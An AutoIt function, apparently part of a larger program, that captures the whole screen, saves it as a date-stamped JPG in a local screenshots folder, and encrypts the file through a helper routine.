
Func screenShot()
	Local $hBmp
	
	; Capture full screen
	$hBmp = _ScreenCapture_Capture("")
	
	$filename=generateNameFromDateTime()
	
	$filePath=@WorkingDir & "\files\screenShots\"&$filename&".jpg"
	
	
	if Not FileExists(@WorkingDir & "\files\screenShots\") Then
		DirCreate(@WorkingDir & "\files\screenShots\")
	EndIf
   
	if _ScreenCapture_SaveImage($filePath, $hBmp) Then
		encryptFile($filePath)
	EndIf
	
	if @error then 
		handleErrors("screenShot", @error)
	EndIf
EndFunc   
